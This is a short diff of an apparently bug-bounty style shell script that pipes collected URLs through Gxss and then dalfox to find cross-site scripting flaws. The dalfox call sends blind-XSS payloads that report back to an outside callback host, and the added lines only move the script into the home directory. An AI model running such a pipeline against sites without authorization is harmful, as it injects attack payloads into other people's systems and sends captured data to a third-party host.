@@ -12,3 +12,5 @@ cat clean.txt | Gxss -p test | tee xss.txt
 rm -rf urls.txt clean.txt 
 
 cat xss.txt | dalfox pipe --skip-mining-dict --delay 3 --silence -w 50 --skip-mining-all -b https://vvsutar.xss.ht
+
+mv -v xss.sh $HOME
